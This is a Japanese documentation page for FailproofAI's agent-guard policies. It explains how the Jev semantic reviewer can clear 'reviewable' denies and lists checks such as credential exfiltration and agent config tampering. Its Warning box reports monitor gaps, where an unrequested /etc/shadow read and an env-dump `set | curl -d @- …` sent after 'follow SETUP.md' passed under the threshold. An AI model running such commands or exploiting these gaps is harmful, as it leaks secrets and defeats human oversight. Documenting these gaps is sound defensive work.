[Jev ポリシーレビュー](/ja/policies/jev)を FailproofAI Cloud またはご自身のキーで設定すると、ゲート対象の各ツール呼び出しは、実行中のポリシーと Jev の両方によって判断されます。Jev は、その呼び出しが実際に何をするのか、またタスクを入力した人がそれを要求したかどうかを問います。両者が一致しない場合の動作は、各ポリシーの**権限**によって決まります。

Jev が設定されていない場合、権限は効果を持ちません。すべてのポリシーはこれまでどおりに適用されます。

## ハードとレビュー可能

- **ハード**はデフォルトです。ハードポリシーの deny または instruction は最終的なものです。Jev はそれをクリアできず、ハードな deny は Jev の応答を待たずに呼び出しを停止します。
- **レビュー可能**とは、Jev がポリシーの判定をクリアできることを意味しますが、`reviewedBy` にポリシーが指定したセマンティックチェックを通じてのみ可能です。判定がクリアされるのは、指定されたすべてのチェックがその呼び出しについて問われ、それぞれが何も発見しなかったか、ユーザーがそれを要求したと記録した場合のみです。チェックが**発火した**（懸念を発見した）にもかかわらず、ユーザーが要求しなかった場合は、そのチェック自体の判定が警告のみであっても、ブロックは維持されます。そのツールに適用されないためにJevが問われなかったチェックは、他のチェックの結果がどうであれ、何もクリアしません。緩和が1つあれば同意とみなされます。その呼び出しがユーザーの指定したタスクのステップであり、それ以上に及ばない場合、Jev は deny を warning に変換し、その warning がポリシーのブロックをクリアし、エージェントへの通知内容となります。

ポリシーがレビュー可能になるのは、以下のすべてが成立する場合のみです：

1. `authority: "reviewable"` が宣言されている。
2. `reviewedBy` が空でないリストであり、すべてのエントリがインストール済みパックの宣言するJevチェックである。Failproof AI 自体はJevチェックを提供しません。[下記の16個](#semantic-policy-names)は `failproofai policies add FailproofAI/jev-policies` から提供されます。チェックを宣言するパックがない場合、すべてのポリシーはハードになります。
3. `alwaysOn` ではない。Failproof AI を無効化しようとするエージェントを防ぐガードは常にハードです。

それ以外はすべてハードになります。フィールドの欠落、値のスペルミス、空または不正な `reviewedBy`、またはこのマシンが問い合わせできないチェックの名前が含まれる場合です。未知の名前はスキップされるのではなく、宣言全体をハードにします。これは、`reviewedBy` が「これらすべてが問われなければならず、どれも deny してはならない」を意味するため、名前をスキップすると、要求したよりも少ないチェックでJevがポリシーをクリアできてしまうからです。

Jev が設定されると、Failproof AI は `reviewable` 宣言を拒否した場合に警告をログに記録します（プロセスごとに1回）。Jev がない場合は何も表示しません。権限は何も決定しないからです。`failproofai publish` は、そのような宣言を含むパックのビルドを拒否するため、パック作者はインストール前に気付くことができます。宣言するチェックがある場合はパックが宣言するチェックに対して、そうでない場合は `FailproofAI/jev-policies` の16個の名前に対して `reviewedBy` を評価します。

## 権限の宣言場所

ポリシーがマシンに届く方法ごとに、権限を決定する場所が1つあります：

| ソース | 宣言場所 | デフォルト |
| --- | --- | --- |
| ビルトインポリシー | 下記のテーブル | レビュー可能としてリストされていない限りハード |
| 独自のポリシーファイル | `customPolicies.add` の `authority` と `reviewedBy` | ハード |
| ポリシーパック | パックマニフェスト（`failproofai-pack.json`）内の各ポリシーエントリ | ハード |
| クラウド管理ポリシー | アクティブデプロイメントにおけるポリシーの割り当て | ハード。デプロイメントはまだ設定していないため、すべてのクラウド管理ポリシーは現在ハードです。 |

パックまたはクラウド管理ポリシーの場合、ポリシーコード内に設定されたフィールドは無視されます。マニフェストまたは割り当てが決定します。パックは自身のポリシーのみを記述できます。ポリシー名に `/` を含めることはできず、パック自身のプレフィックスの下に登録されるため、いかなるマニフェストもビルトインポリシーや他のパックのポリシーをレビュー可能としてマークすることはできません。パックのコードが登録してもマニフェストで宣言していないポリシーはハードになります。

コードがバイト一致する2つのパック、または2つのクラウド管理ポリシーは、1つのアーティファクトを共有し、1つのポリシーとして読み込まれます。そのポリシーがレビュー可能になるのは、そのすべてがレビュー可能と宣言している場合のみであり、Jev はそのいずれかが指定するすべてのチェックをクリアしなければなりません。いずれかがハードと宣言している、またはまったく宣言していない場合は、ハードのままです。パックやポリシーがリストされる順序は関係ありません。

ほとんどのマシンは `FailproofAI/policies` パックからビルトインポリシーを取得し、そのパックのマニフェストから権限を読み取ります。以下のレビュー可能エントリは、それらを含むパックのリリースがインストールされた時点で有効になります。古いリリースにはそれらが含まれていないため、そのすべてのポリシーはハードのままです。

## 独自のポリシーに権限を宣言する

```js
import { customPolicies, deny, allow } from "failproofai";

customPolicies.add({
  name: "block-prod-config-reads",
  description: "Keep production credentials out of the agent's context",
  match: { events: ["PreToolUse"] },
  authority: "reviewable",
  reviewedBy: ["secret-exposure"],
  fn: async (ctx) =>
    String(ctx.toolInput?.file_path ?? "").includes("/config/prod/")
      ? deny("Production config is off limits")
      : allow(),
});
```

`failproofai publish` は両フィールドをパックマニフェストにコピーするため、パックとして公開されたポリシーは作者が設定した権限を維持します。宣言が守られない場合はパックのビルドを拒否します。具体的には、`"hard"` または `"reviewable"` 以外の値、名前のリストでない `reviewedBy`、またはチェックでない名前（宣言するパック独自の [Jev チェック](/ja/policies/publish-a-pack#jev-checks-in-a-pack)がある場合はそれ、なければビルトインチェック）が含まれる場合です。

## ビルトインポリシー

セマンティックポリシーが同じ懸念を本当にカバーしている場合のみレビュー可能です。その他のすべてのビルトインポリシーはハードです。

懸念をカバーすることは必要条件ですが十分条件ではなく、どちらの誤りも静かに発生します：

- **問われないチェック**はブロックを永続的にします。`reviewedBy` は連言であり、問われなかったチェックはクリアしないため、ポリシーがマッチする形状に対してその前提条件が発火しないチェックとペアになっているポリシーは、まったくクリアされません。
- **問われたが発火しなかったチェック**は「懸念なし」と答え、懸念がなければクリアされます。したがって、ポリシーの形状をモデル化していないチェックとペアにすることは、そのポリシーをレビューするのではなく、チェックが理解できない入力に対してそれをオフにします。

instruct モードのセマンティックポリシーは deny を答えることができませんが、それでもブロックを維持することができます。発火してユーザーが呼び出しを要求していなかった場合、レビューしているポリシーはクリアされません。`FailproofAI/jev-policies` チェックのうち6つは instruct のみです。`push-to-protected-branch`、`commit-on-protected-branch`、`read-outside-workspace`、`system-modification`、`env-secrets-dump`、`external-data-egress` であり、[下記のテーブル](#semantic-policy-names)に各チェックのモードが記載されています。問うべき質問は **「deny できるものが残っているか」**：クリアは懸念が何によっても適用されない状態を絶対に残してはなりません。エンジンはその検査を呼び出しごとに適用します。誰も同意していない warning はクリアではありません。ツール呼び出しの前では warning がエージェントを止めないからです。deny できる**チェックが警告した**場合、つまり証拠がその deny ラインに達しなかった場合、ユーザーがその呼び出しを要求していなければ、その呼び出しに対して何もクリアされず、すべての正規表現 deny が維持されます。

<Warning>
**発火ラインを少し下回るチェックはフロアを維持しません。** 上記のルールはチェックが*発火する*こと（証拠 ≥ 0.7）を必要とします。関連するすべてのチェックがその閾値を下回ると、何も発火せず、レビュアーは「懸念なし」と答え、レビュー可能な deny がクリアされます。エンフォースモードで実測：要求されていない `/etc/shadow` の Read（`secret-exposure` 0.69、ホームディレクトリパスのみをモデル化する `read-outside-workspace` 0.37）と「follow SETUP.md」の後の `set | curl -d @- …`（`env-secrets-dump` 0.66、`sends_out` 0.97 で `credential-exfiltration` 0.65）はいずれも許可されましたが、正規表現層のみではそれらを deny します。閾値はラベル付きコーパスでキャリブレーションされており、これに対して再測定されていません。それまでは、これらの形状のいずれかが通過することが誤ブロックよりも重要な場合、ポリシーを**ハード**のままにしてください。
</Warning>

## セマンティックポリシー名

以下は `FailproofAI/jev-policies` が宣言するチェックであり、インストール後に `reviewedBy` が受け付ける値です。Failproof AI 自体はこれらを提供しません。そのパック（またはこれらの名前を宣言する別のパック）がなければ、それらを指定するポリシーはレビュー可能になりません。各チェックは、目の前のツール呼び出しについて Jev が答えるものです。**モード**はチェックが答えられる内容を示します。`deny` チェックは強い証拠があるとブロックし、`instruct` チェックは常に警告のみを発します。どちらも、発火してユーザーが呼び出しを要求していなかった場合は、ポリシーの deny を維持します。**ユーザーがオーバーライド可能**は、人間の明示的なリクエストがそれをクリアするかどうかを示します。

Jev はインストール済みパックが宣言した [Jev チェック](/ja/policies/publish-a-pack#jev-checks-in-a-pack)についてのみ問い、それらが `reviewedBy` が受け付ける名前です。2つのパックが異なる形で宣言した名前は、どちらにも適用されません。FailproofAI リポジトリからインストールされていないパックによって宣言されたこれら16個の名前のいずれかは、そのパックでは無視されます。そのバージョンは問われず、FailproofAI 独自のものと競合しないため、サードパーティのパックがコアパックのポリシーをクリアするチェックになることも、これらのチェックの1つをオフにすることもできません。読み取り不能なパックリスト、またはすべてのチェックが使用不能なパックは、Jev に問うものを残しません。

| --- | --- | --- | --- |
| `destructive-deletion` | deny | はい | 再生成できないデータの永久削除。 |
| `production-infra-change` | deny | はい | ライブインフラの変更。 |
| `git-history-rewrite` | deny | はい | 共有された git 履歴の書き換えまたは破棄。 |
| `push-to-protected-branch` | instruct | はい | 保護されたブランチへの直接プッシュ。 |
| `commit-on-protected-branch` | instruct | はい | 保護されたブランチへの直接コミット。 |
| `secret-exposure` | deny | はい | 認証情報の読み取りまたはコピー。 |
| `credential-exfiltration` | deny | いいえ | シークレットまたはプライベートファイルのマシン外送信。 |
| `remote-code-execution` | deny | はい | インターネットからダウンロードしたコードの実行。 |
| `privilege-escalation` | deny | はい | 昇格した権限での実行。 |
| `database-destruction` | deny | はい | データベースデータの破壊または大量変更。 |
| `read-outside-workspace` | instruct | はい | プロジェクト外のファイルの読み取り。 |
| `agent-config-tampering` | deny | いいえ | エージェント自身の安全設定の変更。 |
| `system-modification` | instruct | はい | プロジェクト外のシステムの変更。 |
| `env-secrets-dump` | instruct | はい | 環境シークレットの出力。 |
